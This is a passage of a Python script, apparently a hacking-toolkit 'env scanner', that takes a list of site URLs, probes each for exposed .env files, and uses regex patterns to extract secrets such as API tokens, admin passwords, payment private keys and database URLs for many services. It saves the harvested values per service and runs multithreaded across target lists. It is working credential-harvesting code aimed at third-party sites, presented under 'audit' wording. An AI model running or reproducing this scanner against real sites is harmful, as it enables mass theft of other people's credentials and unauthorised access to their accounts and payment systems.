            r'ASANA_WORKSPACE_ID=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'ASANA_ACCESS_TOKEN',
        'filename': 'asana.txt'
    },
    # Trello configuration
    'trello': {
        'keywords': ['TRELLO_'],
        'patterns': [
            r'TRELLO_API_KEY=(.+?)(?:\r?\n|$)',
            r'TRELLO_API_TOKEN=(.+?)(?:\r?\n|$)',
            r'TRELLO_BOARD_ID=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'TRELLO_API_KEY',
        'filename': 'trello.txt'
    },
    # Grafana configuration
    'grafana': {
        'keywords': ['GRAFANA_'],
        'patterns': [
            r'GRAFANA_API_TOKEN=(.+?)(?:\r?\n|$)',
            r'GRAFANA_URL=(.+?)(?:\r?\n|$)',
            r'GRAFANA_ADMIN_USER=(.+?)(?:\r?\n|$)',
            r'GRAFANA_ADMIN_PASSWORD=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'GRAFANA_API_TOKEN',
        'filename': 'grafana.txt'
    },
    # AWS-specific extensions (e.g., Lambda, SNS, SQS)
    'aws_extended': {
        'keywords': ['AWS_'],
        'patterns': [
            r'AWS_LAMBDA_FUNCTION_NAME=(.+?)(?:\r?\n|$)',
            r'AWS_SNS_TOPIC_ARN=(.+?)(?:\r?\n|$)',
            r'AWS_SQS_QUEUE_URL=(.+?)(?:\r?\n|$)',
            r'AWS_COGNITO_USER_POOL_ID=(.+?)(?:\r?\n|$)',
            r'AWS_COGNITO_CLIENT_ID=(.+?)(?:\r?\n|$)',
            r'AWS_DYNAMODB_TABLE=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'AWS_LAMBDA_FUNCTION_NAME',
        'filename': 'aws_extended.txt'
    },
    # Contentful configuration
    'contentful': {
        'keywords': ['CONTENTFUL_'],
        'patterns': [
            r'CONTENTFUL_SPACE_ID=(.+?)(?:\r?\n|$)',
            r'CONTENTFUL_ACCESS_TOKEN=(.+?)(?:\r?\n|$)',
            r'CONTENTFUL_ENVIRONMENT=(.+?)(?:\r?\n|$)',
            r'CONTENTFUL_MANAGEMENT_TOKEN=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'CONTENTFUL_SPACE_ID',
        'filename': 'contentful.txt'
    },
    # Discourse configuration
    'discourse': {
        'keywords': ['DISCOURSE_'],
        'patterns': [
            r'DISCOURSE_API_KEY=(.+?)(?:\r?\n|$)',
            r'DISCOURSE_API_USERNAME=(.+?)(?:\r?\n|$)',
            r'DISCOURSE_URL=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'DISCOURSE_API_KEY',
        'filename': 'discourse.txt'
    },
    # Jira configuration
    'jira': {
        'keywords': ['JIRA_'],
        'patterns': [
            r'JIRA_API_TOKEN=(.+?)(?:\r?\n|$)',
            r'JIRA_EMAIL=(.+?)(?:\r?\n|$)',
            r'JIRA_URL=(.+?)(?:\r?\n|$)',
            r'JIRA_PROJECT_KEY=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'JIRA_API_TOKEN',
        'filename': 'jira.txt'
    },
    # Prometheus configuration
    'prometheus': {
        'keywords': ['PROMETHEUS_'],
        'patterns': [
            r'PROMETHEUS_URL=(.+?)(?:\r?\n|$)',
            r'PROMETHEUS_API_TOKEN=(.+?)(?:\r?\n|$)',
            r'PROMETHEUS_BASIC_AUTH_USER=(.+?)(?:\r?\n|$)',
            r'PROMETHEUS_BASIC_AUTH_PASS=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'PROMETHEUS_URL',
        'filename': 'prometheus.txt'
    },
    # Loggly configuration
    'loggly': {
        'keywords': ['LOGGLY_'],
        'patterns': [
            r'LOGGLY_TOKEN=(.+?)(?:\r?\n|$)',
            r'LOGGLY_SUBDOMAIN=(.+?)(?:\r?\n|$)',
            r'LOGGLY_TAGS=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'LOGGLY_TOKEN',
        'filename': 'loggly.txt'
    },
    # Braintree configuration
    'braintree': {
        'keywords': ['BRAINTREE_'],
        'patterns': [
            r'BRAINTREE_MERCHANT_ID=(.+?)(?:\r?\n|$)',
            r'BRAINTREE_PUBLIC_KEY=(.+?)(?:\r?\n|$)',
            r'BRAINTREE_PRIVATE_KEY=(.+?)(?:\r?\n|$)',
            r'BRAINTREE_ENVIRONMENT=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'BRAINTREE_MERCHANT_ID',
        'filename': 'braintree.txt'
    },
    # Clerk configuration
    'clerk': {
        'keywords': ['CLERK_'],
        'patterns': [
            r'CLERK_API_KEY=(.+?)(?:\r?\n|$)',
            r'CLERK_SECRET_KEY=(.+?)(?:\r?\n|$)',
            r'CLERK_PUBLISHABLE_KEY=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'CLERK_API_KEY',
        'filename': 'clerk.txt'
    },
    # FaunaDB configuration
    'fauna': {
        'keywords': ['FAUNA_'],
        'patterns': [
            r'FAUNA_SECRET=(.+?)(?:\r?\n|$)',
            r'FAUNA_DOMAIN=(.+?)(?:\r?\n|$)',
            r'FAUNA_SCHEME=(.+?)(?:\r?\n|$)',
            r'FAUNA_PORT=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'FAUNA_SECRET',
        'filename': 'fauna.txt'
    },
    # Hasura configuration
    'hasura': {
        'keywords': ['HASURA_'],
        'patterns': [
            r'HASURA_GRAPHQL_ADMIN_SECRET=(.+?)(?:\r?\n|$)',
            r'HASURA_GRAPHQL_ENDPOINT=(.+?)(?:\r?\n|$)',
            r'HASURA_GRAPHQL_JWT_SECRET=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'HASURA_GRAPHQL_ADMIN_SECRET',
        'filename': 'hasura.txt'
    },
    # PlanetScale configuration
    'planetscale': {
        'keywords': ['PLANETSCALE_'],
        'patterns': [
            r'PLANETSCALE_DATABASE_URL=(.+?)(?:\r?\n|$)',
            r'PLANETSCALE_API_TOKEN=(.+?)(?:\r?\n|$)',
            r'PLANETSCALE_ORG_ID=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'PLANETSCALE_DATABASE_URL',
        'filename': 'planetscale.txt'
    },
    # Chargebee configuration
    'chargebee': {
        'keywords': ['CHARGEBEE_'],
        'patterns': [
            r'CHARGEBEE_API_KEY=(.+?)(?:\r?\n|$)',
            r'CHARGEBEE_SITE=(.+?)(?:\r?\n|$)',
            r'CHARGEBEE_WEBHOOK_SECRET=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'CHARGEBEE_API_KEY',
        'filename': 'chargebee.txt'
    }
}

        for config_type, config in env_patterns.items():
            if any(kw in content for kw in config['keywords']):
                matches = [re.search(p, content) for p in config['patterns']]
                matches = [m.group(0).strip() for m in matches if m and '=""' not in m.group(0)]
                if matches and (not config['must_have'] or any(config['must_have'] in m for m in matches)):
                    results.append(config_type)
                    self.save_results(config['filename'], f"{url}\n" + "\n".join(matches) + "\n\n")

        if results:
            self.save_results('env.txt', f"{url}/.env\n")
            print(f"[INFO] {url}: Found [{', '.join(results)}]")
        else:
            print(f"[WARNING] {url}: No valid .env data found")

    def save_results(self, filename: str, content: str) -> None:
        file_path = self.results_dir / filename
        with file_path.open('a', encoding='utf-8') as f:
            f.write(content)

    def audit(self, url: str, paths: List[str]) -> None:
        validated_url = self.validate_url(url)
        if not validated_url:
            print(f"[ERROR] Invalid URL: {url}")
            return
        print(f"[INFO] Auditing {validated_url}")
        self.check_env_paths(validated_url, paths)

    def run(self, urls: List[str], paths: List[str], max_workers: int = 5) -> None:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            executor.map(lambda url: self.audit(url, paths), urls)


def load_paths(file_path: str) -> List[str]:
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[ERROR] Paths file not found: {file_path}")
        return []
    except Exception as e:
        print(f"[ERROR] Error reading paths file {file_path}: {e}")
        return []


def urfavmine():
    clear()
    print(banner)
    print(f"{wh}[{g}+{wh}] Using Tools env scanner \n{wh}[{g}+{wh}] result save in Result/env-scanner \n\n{res}")
    try:
        urls_file = input(f"{wh}[{g}+{res}]{wh} Enter URLs list file: ").strip()
        if not Path(urls_file).is_file():
            print(f"{wh}[{r}!{res}]{wh} URLs file not found: {urls_file}")
            return

        with open(urls_file, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
        
        if not urls:
            print("{wh}[{r}!{res}]{wh} No URLs found in the file")
            return

        paths = load_paths('lib/files/env.txt')
        if not paths:
            print(f"{wh}[{r}!{res}]{wh} No paths loaded. Ensure path.txt exists.")
            return

        threads = input(f"{wh}[{g}+{res}]{wh} Enter number of threads (default 5): ").strip()
        try:
            max_workers = int(threads) if threads else 5
            if max_workers < 1:
                raise ValueError(f"{wh}[{r}!{res}]{wh} Threads must be positive")
        except ValueError as e:
            print(f"{wh}[{r}!{res}]{wh} Invalid threads value: {e}")
            return

        auditor = EnvAuditor()
        auditor.run(urls, paths, max_workers)
        print(f"{wh}[{r}+{res}]{wh} Task completed")

    except KeyboardInterrupt:
        print(f"{wh}[{r}!{res}]{wh} Audit interrupted by user")
    except Exception as e:
        print(f"{wh}[{r}!{res}]{wh} Unexpected error: {e}")

if __name__ == '__main__':
    urfavmine()